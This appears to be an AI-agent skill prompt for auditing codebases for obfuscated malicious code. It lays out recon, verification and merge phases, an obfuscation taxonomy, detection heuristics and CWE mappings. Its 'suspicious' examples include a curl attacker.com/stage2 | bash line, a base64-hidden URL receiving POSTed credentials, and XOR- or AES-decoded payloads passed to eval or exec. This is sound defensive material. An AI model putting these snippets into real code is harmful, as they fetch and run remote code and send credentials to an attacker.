# Obfuscated Code Detection

[ref: #obfuscation-detection]

You are performing a focused security assessment to find **obfuscated code** that may conceal malicious payloads, backdoors, or unauthorized behavior. Obfuscation is not a vulnerability by itself — it is a signal that requires investigation. This skill uses a three-phase approach with subagents: **recon** (find obfuscated construction sites), **batched verify** (determine whether obfuscation hides malicious behavior, in parallel batches of 3), and **merge** (consolidate results).

**Prerequisites**: `{{ REPORTS_ROOT }}/01_architecture.md` must exist. Run the analysis skill first if it doesn't.

## Table of contents

- [What is obfuscated code](#what-is-obfuscated-code)
- [Vulnerable vs. Secure Examples](#vulnerable-vs-secure-examples)
- [Obfuscation Taxonomy](#obfuscation-taxonomy)
- [Detection heuristics per technique](#detection-heuristics-per-technique)
- [Execution](#execution)
- [OWASP API Security Top 10 2023 mapping](#owasp-api-security-top-10-2023-mapping)
- [CWE references](#cwe-references)
- [Important Reminders](#important-reminders)
- [References](#references)

---

## What is obfuscated code

Obfuscation is the deliberate transformation of code to make it harder for humans and static analyzers to understand, while preserving functionality. In a security audit, obfuscation matters when it is used to hide malicious intent — such as concealing C2 addresses, shell commands, credential theft, or unauthorized dynamic execution.

The core question: *is the obfuscation serving a legitimate business purpose (e.g., license protection, asset protection), or is it hiding attacker-controlled strings, behavior, or access?*

### What obfuscation IS (in scope)

- **Encoding/concatenation tricks** that reassemble malicious strings at runtime.
- **Control-flow flattening** that turns straightforward logic into a state-machine dispatcher.
- **Opaque predicates** — branch conditions that always evaluate the same way but appear complex.
- **String decryption loops** that decode payloads just before use.
- **Encrypted or compressed payloads** embedded as data blobs.
- **Identifier mangling** combined with dynamic evaluation or network activity.

### What obfuscation is NOT (out of scope)

Do not flag these as security findings on their own:

- **Minification** for web performance (e.g., UglifyJS, terser) that preserves names and structure.
- **Compiled artifacts** whose source is open and auditable.
- **Legitimate packers or protectors** used for license enforcement, provided they are commercially known and not hiding malicious behavior.
- **Simple base64 of non-sensitive data** such as SVG icons or public keys.
- **Hashes, checksums, or signatures** that are not executable payloads.

### Patterns that reduce obfuscation risk

When you see these patterns, the obfuscation is likely **not malicious**:

**1. Commercial, documented obfuscator with source maps**
```javascript
// Source map exists; original source is open and reviewable
//# sourceMappingURL=app.min.js.map
```

**2. KMS or key-derivation based decryption**
```python
# Payload is encrypted with a key from a trusted KMS, not a hardcoded byte
secret = kms.decrypt(ciphertext=encrypted_blob)["Plaintext"]
```

**3. Build-time string encryption with audit trail**
- Strings are encrypted by the build pipeline, not by hand.
- Decryption keys are tied to the build signature, not attacker-controlled.
- The technique is documented and reviewed.

---

## Vulnerable vs. Secure Examples

### Base64 / hex concatenation

```javascript
// SUSPICIOUS: reassembles a URL from fragments and decodes it at runtime
const part1 = "aHR0cHM6Ly9h";
const part2 = "dHRhY2tlci5jb20=";
const url = atob(part1 + part2);
fetch(url, { method: "POST", body: JSON.stringify(credentials) });

// SECURE: destination is explicit and reviewable
const url = config.get("telemetry.endpoint"); // e.g., "https://telemetry.example.com"
fetch(url, { method: "POST", body: JSON.stringify(telemetry) });
```

### Control-flow flattening

```javascript
// SUSPICIOUS: dispatcher-driven state machine hides original flow
function run() {
  let state = 0;
  while (true) {
    switch (state) {
      case 0: download(); state = 1; break;
      case 1: decrypt(); state = 2; break;
      case 2: exec(); return;
    }
  }
}

// SECURE: straightforward, named control flow
async function run() {
  const config = await loadConfig();
  await processJobs(config);
}
```

### Opaque predicates

```python
# SUSPICIOUS: branch condition is always true but looks dynamic
import os
if (len(os.name) * 0) == 0:
    os.system("curl attacker.com/stage2 | bash")

# SECURE: condition is meaningful and auditable
if os.environ.get("DEPLOY_ENV") == "staging":
    enable_debug_logging()
```

### String decryption loops

```javascript
// SUSPICIOUS: XOR loop decodes a command before eval
const blob = [0x1b, 0x6c, ...];
const key = 0x42;
const cmd = blob.map(b => String.fromCharCode(b ^ key)).join("");
eval(cmd);

// SECURE: no hidden commands; configuration is explicit
const cmd = config.verifiedCommand;
if (ALLOWED_COMMANDS.includes(cmd)) {
  spawn(cmd, args);
}
```

### Encrypted payloads

```python
# SUSPICIOUS: large encrypted blob decrypted with hardcoded key
from Crypto.Cipher import AES
payload = bytes.fromhex("4a3b2c...")  # hundreds of KB
key = b"hardcoded-key-16"
cipher = AES.new(key, AES.MODE_CBC, iv=b"hardcoded-iv-16")
exec(cipher.decrypt(payload))

# SECURE: payload is fetched from a trusted, audited store with signature check
payload = fetch_signed_artifact(url=config.ARTIFACT_URL, signature=config.EXPECTED_SIG)
```

### Identifier mangling + dynamic access

```python
# SUSPICIOUS: random identifiers plus dynamic getattr to reach private APIs
_0x1a2b = getattr(__import__("os"), "s" + "ystem")
_0x1a2b("id")

# SECURE: explicit, reviewable API calls
import subprocess
subprocess.run(["id"], capture_output=True)
```

---

## Obfuscation Taxonomy

| Technique | Description | Typical signals |
| --- | --- | --- |
| **Base64 / hex concatenation** | Splitting sensitive strings into encoded fragments that are concatenated and decoded at runtime. | Multiple `atob`, `b64decode`, `Buffer.from`, `bytes.fromhex` calls; string joins of high-entropy fragments; fragments that decode to URLs, commands, or keys. |
| **Control-flow flattening** | Restructuring a function into a loop + switch dispatcher controlled by a state variable. | `while(true) { switch(state) { ... } }`; `goto`-like jumps; state variables with numeric labels; low-level blocks that do not match source-level constructs. |
| **Opaque predicates** | Conditional branches whose outcome is known to the author but appears dynamic to analysis. | Conditions like `if (x * 0 === 0)`, `if (7 * 3 > 20)`, `if (len(s) >= 0)` that always evaluate the same way; branches guarding malicious code. |
| **String decryption loops** | Runtime loops that XOR, rotate, substitute, or AES-decrypt literal byte arrays before use. | Loops over byte arrays with bitwise operations; `fromCharCode`, `chr`, `String.fromCharCode` in tight loops; output fed to `eval`, `exec`, `Function`, or network calls. |
| **Encrypted payloads** | Large embedded ciphertext, compressed blobs, or resource files decrypted at runtime. | Multi-KB hex/base64 constants named `payload`, `shell`, `data`; AES/RC4/XOR decryption routines; data in PE/ELF overlays, resources, or hidden files. |
| **Identifier mangling** | Renaming variables and functions to meaningless or random strings, often combined with dynamic access. | Names like `_0x1a2b`, `a`, `b`, `c`; heavy use of `eval`, `getattr`, `window[name]`, `call_user_func` with mangled names. |
| **Packing / virtualization** | Wrapping executable code in a custom interpreter or packer (e.g., UPX, Themida, KoiVM, ConfuserEx). | Unusual entry points, embedded interpreters, high entropy sections, inability to decompile cleanly. |

---

## Detection heuristics per technique

### Base64 / hex concatenation

- Regex-detect base64 and hex alphabets in string literals that are joined before decoding.
- Check whether decoded values are URLs, shell commands, PowerShell snippets, or API keys.
- Flag command lines or scripts that use excessive concatenation, substrings, or escape characters to assemble known cmdlet names (`Invoke-Expression`, `iex`, `certutil`, etc.).

### Control-flow flattening

- Look for `while(true)` loops containing large `switch` statements driven by a mutable state variable.
- Compare function cyclomatic complexity to human-readable structure; flattened functions have many blocks but no clear nesting.
- In Java/C#, look for obfuscator patterns from known tools (ConfuserEx, Skidfuscator, Zelix KlassMaster).

### Opaque predicates

- Evaluate constant expressions that always yield the same truth value and guard real code.
- Look for mathematically trivial conditions used to decide between a benign block and a suspicious block.
- Flag dead code that is unreachable except through an always-true predicate.

### String decryption loops

- Identify loops whose sole purpose is to transform a byte/char array into a string.
- Check if the output reaches sensitive sinks: `eval`, `exec`, `system`, `subprocess`, `fetch`, `requests`, `Assembly.Load`, `Method.invoke`.
- Calculate Shannon entropy of the input array; encrypted/obfuscated strings often exceed 4.5 bits/char.

### Encrypted payloads

- Search for large high-entropy literals or embedded resource files.
- Look for crypto routines (AES, RC4, XOR) with hardcoded keys operating on those literals.
- In binaries, check PE/ELF overlays and resource sections for appended data.

### Identifier mangling + dynamic access

- Detect variable/function names that are random hex (`_0x123abc`) or single letters concentrated in one file.
- Combine mangling signals with dynamic evaluation: `eval`, `new Function`, `getattr`, `call_user_func`.
- Review whether mangled code performs network, filesystem, or process operations.

---

## Execution

This skill runs in three phases using subagents. Pass the contents of `{{ REPORTS_ROOT }}/01_architecture.md` to all subagents as context.

### Phase 1: Recon — Find Obfuscated Construction Sites

Launch a subagent with the following instructions:

> **Goal**: Find every location in the codebase where obfuscation techniques are used to hide strings, control flow, or payloads. Write results to `{{ REPORTS_ROOT }}/22_recon.md`.
>
> **Context**: You will be given the project's architecture summary. Use it to understand the tech stack, build pipeline, and whether commercial obfuscators or minifiers are expected.
>
> **What to search for**:
>
> 1. **Base64 / hex concatenation**:
>    - Strings split and joined before `atob`, `b64decode`, `Buffer.from`, `bytes.fromhex`, `base64.b64decode`.
>    - Decoded strings that look like URLs, commands, or secrets.
>
> 2. **Control-flow flattening**:
>    - `while(true)` with `switch(state)` dispatchers.
>    - Obfuscator-specific patterns (ConfuserEx, Skidfuscator, Zelix, O-LLVM).
>
> 3. **Opaque predicates**:
>    - Always-true or always-false conditions that guard sensitive code.
>
> 4. **String decryption loops**:
>    - XOR/rot/substitution/AES loops over byte arrays that produce strings.
>    - Output reaching `eval`, `exec`, `system`, `fetch`, `requests`, reflection, etc.
>
> 5. **Encrypted payloads**:
>    - Large high-entropy literals or resource files.
>    - Crypto routines with hardcoded keys.
>
> 6. **Identifier mangling + dynamic access**:
>    - Random hex identifiers, single-letter names, `eval`/`getattr`/`call_user_func` with constructed names.
>
> **What to skip**:
> - Standard minified frontend bundles with source maps.
> - Documented commercial obfuscators used for license protection.
> - Non-sensitive base64/hex data such as public keys, icons, hashes.
>
> **Output format** — write to `{{ REPORTS_ROOT }}/22_recon.md`:
>
> ```markdown
> # Obfuscation Recon: [Project Name]
>
> ## Summary
> Found [N] obfuscated construction sites: [X] encoding/concatenation, [Y] control-flow flattening, [Z] string decryption, etc.
>
> ## Obfuscated Construction Sites
>
> ### 1. [Descriptive name]
> - **File**: `path/to/file.ext` (lines X-Y)
> - **Function / endpoint**: [name]
> - **Technique**: [base64 concat / flattening / opaque predicate / decryption loop / encrypted payload / mangling]
> - **Obfuscation signal**: [the pattern found]
> - **Code snippet**:
>   ```
>   [relevant code]
>   ```
> - **Why it matters**: [what the obfuscation might hide]
>
> [Repeat for each site]
> ```

### After Phase 1: Check for Candidates Before Proceeding

After Phase 1 completes, read `{{ REPORTS_ROOT }}/22_recon.md`. If the recon found **zero obfuscated sites** (the summary reports "Found 0" or the "Obfuscated Construction Sites" section is empty or absent), **skip Phase 2 and Phase 3 entirely**. Instead, write the following content to `{{ REPORTS_ROOT }}/22_obfuscation.md` and stop:

```markdown
# Obfuscated Code Analysis Results

No obfuscated code found.
```

Only proceed to Phase 2 if Phase 1 found at least one obfuscated site.

### Phase 2: Verify — Determine What Obfuscation Hides (Batched)

After Phase 1 completes, read `{{ REPORTS_ROOT }}/22_recon.md` and split the sites into **batches of up to 3 sites each**. Launch **one subagent per batch in parallel**. Each subagent analyzes only its assigned sites and writes results to its own batch file.

**Batching procedure**:

1. Read `{{ REPORTS_ROOT }}/22_recon.md` and count the numbered site sections (`### 1.`, `### 2.`, etc.).
2. Divide them into batches of up to 3.
3. For each batch, extract the full text of those site sections from the recon file.
4. Launch all batch subagents **in parallel**, passing each one only its assigned sites.
5. Each subagent writes to `{{ REPORTS_ROOT }}/22_batch_N.md` where N is the 1-based batch number.
6. Identify the project's primary language/framework from `{{ REPORTS_ROOT }}/01_architecture.md` and select **only the matching examples** from the "Vulnerable vs. Secure Examples" section above. Include these selected examples in each subagent's instructions where indicated by `[TECH-STACK EXAMPLES]` below.

Give each batch subagent the following instructions:

> **Goal**: For each assigned obfuscated construction site, determine whether the obfuscation hides malicious behavior or has a legitimate purpose. Write results to `{{ REPORTS_ROOT }}/22_batch_[N].md`.
>
> **Your assigned sites** (from the recon phase):
>
> [Paste the full text of the assigned site sections here, preserving the original numbering]
>
> **Context**: You will be given the project's architecture summary. Use it to understand normal build tools, obfuscators, and protection mechanisms in use.
>
> **Obfuscation reference — what to look for**:
>
> For each site, answer:
>
> 1. **What is being hidden?**
>    - Decode/decrypt the string or payload if the key is recoverable.
>    - Determine whether the hidden content is a URL, command, key, or executable code.
> 2. **Where does the decrypted content flow?**
>    - Does it reach `eval`, `exec`, `system`, `subprocess`, `fetch`, `requests`, `Assembly.Load`, reflection, or the filesystem?
> 3. **Is the obfuscation legitimate?**
>    - Is it produced by a documented build tool or commercial protector?
>    - Is there a source map or original source available?
>    - Does it protect intellectual property, or does it hide malicious behavior?
>
> **Vulnerable vs. secure examples for this project's tech stack**:
>
> [TECH-STACK EXAMPLES]
>
> **Classification**:
> - **Malicious Obfuscation**: Obfuscation hides malicious strings, commands, C2 addresses, or unauthorized dynamic execution.
> - **Likely Malicious**: Strong indicators but uncertainty about the hidden payload or intent.
> - **Legitimate Obfuscation**: Documented, expected protection (e.g., license obfuscation, minification with source maps).
> - **Needs Manual Review**: Cannot determine intent from static analysis alone; requires runtime inspection or maintainer input.
>
> **Required fields for every finding**:
> - **OWASP API 2023 root-cause risk**: choose API8:2023 Security Misconfiguration and/or API10:2023 Unsafe Consumption of APIs, and explain why.
> - **CWE**: map to the most specific CWE from the reference (e.g., CWE-912, CWE-94, CWE-78, CWE-506).
> - **Deobfuscation notes**: describe how the string/payload was decoded or what prevents decoding.
>
> **Output format** — write to `{{ REPORTS_ROOT }}/22_batch_[N].md`:
>
> ```markdown
> # Obfuscation Batch [N] Results
>
> ## Findings
>
> ### [MALICIOUS OBFUSCATION] Descriptive name
> - **File**: `path/to/file.ext` (lines X-Y)
> - **Endpoint / function**: [name]
> - **OWASP API 2023 root-cause risk**: [API8 / API10 / both]
> - **CWE**: [CWE-912 / CWE-94 / CWE-78 / CWE-506 / ...]
> - **Issue**: [e.g., "Base64-encoded shell command decoded and passed to eval"]
> - **Hidden content**: [decoded URL, command, or payload summary]
> - **Taint trace**: [from encoded string to execution sink]
> - **Impact**: [what an attacker can do]
> - **Evidence**:
>   ```
>   [code snippet]
>   ```
> - **Remediation**: [remove obfuscation, replace with explicit configuration, rotate exposed secrets]
> - **Deobfuscation / verification**:
>   ```
>   [steps to safely reproduce decoding]
>   ```
>
> ### [LIKELY MALICIOUS] Descriptive name
> ...
>
> ### [LEGITIMATE OBFUSCATION] Descriptive name
> ...
>
> ### [NEEDS MANUAL REVIEW] Descriptive name
> ...
> ```

### Phase 3: Merge — Consolidate Batch Results

After **all** Phase 2 batch subagents complete, read every `{{ REPORTS_ROOT }}/22_batch_*.md` file and merge them into a single `{{ REPORTS_ROOT }}/22_obfuscation.md`. You (the orchestrator) do this directly — no subagent needed.

**Merge procedure**:

1. Read all `{{ REPORTS_ROOT }}/22_batch_1.md`, `{{ REPORTS_ROOT }}/22_batch_2.md`, ... files.
2. Collect all findings from each batch file and combine them into one list, preserving the original classification and all detail fields.
3. Count totals across all batches for the executive summary.
4. Write the merged report to `{{ REPORTS_ROOT }}/22_obfuscation.md` using this format:

```markdown
# Obfuscated Code Analysis Results: [Project Name]

## Executive Summary
- Obfuscated sites analyzed: [total across all batches]
- Malicious Obfuscation: [N]
- Likely Malicious: [N]
- Needs Manual Review: [N]
- Legitimate Obfuscation: [N]

## Findings

[All findings from all batches, grouped by classification:
 MALICIOUS first, then LIKELY MALICIOUS, then NEEDS MANUAL REVIEW, then LEGITIMATE.
 Preserve every field from the batch results exactly as written.]
```

5. After writing `{{ REPORTS_ROOT }}/22_obfuscation.md`, **delete all intermediate batch files** (`{{ REPORTS_ROOT }}/22_batch_*.md`).

---

## OWASP API Security Top 10 2023 mapping

| OWASP Risk | Why Obfuscation Matters |
|---|---|
| **API8:2023 Security Misconfiguration** | Obfuscated code can hide backdoors, unauthorized endpoints, and insecure build-pipeline practices. |
| **API10:2023 Unsafe Consumption of APIs** | Obfuscated payloads may conceal abuse of third-party APIs, C2 callbacks, or data exfiltration. |

---

## CWE references

- CWE-912: Hidden Functionality
- CWE-94: Improper Control of Generation of Code ('Code Injection')
- CWE-78: OS Command Injection
- CWE-506: Embedded Malicious Code
- CWE-507: Trojan Horse
- CWE-116: Improper Encoding or Escaping of Output

CWE-912 is the parent weakness for findings where obfuscation hides malicious behavior.

---

## Important Reminders

- **Obfuscation alone is not a vulnerability.** Always trace the obfuscated content to an execution sink or network destination before classifying it as malicious.
- Prefer **deobfuscation** over guessing. If the key/algorithm is recoverable, decode the string or payload and inspect it.
- Distinguish **build-time obfuscation** (minification, license protection) from **hand-rolled obfuscation** designed to evade review.
- Check for **source maps** and **original source** before flagging minified frontend bundles.
- Calculate **Shannon entropy** when evaluating encoded literals; high entropy combined with sensitive sinks is a strong signal.
- In .NET/Java binaries, high confidence obfuscation may require decompiler output review; note when decompilation fails or produces garbage.
- Subagents are read-only: they must not modify project source code, commit changes, or run potentially malicious code.
- Preserve the original obfuscated snippet and the decoded content (if any) as evidence.

---

## References

- MITRE ATT&CK T1027 — Obfuscated Files or Information
- Red Canary Threat Detection Report: Obfuscated Files or Information
- VMRay: Malware Obfuscation Techniques
- Palo Alto Networks Unit 42: Uncovering .NET Malware Obfuscated by Encryption and Virtualization
- Akamai: Catch Me if You Can — JavaScript Obfuscation
- Obfuscator-LLVM: Control Flow Flattening and Opaque Predicates
- K7 Labs / ConfuserEx / KoiVM research on .NET virtualization
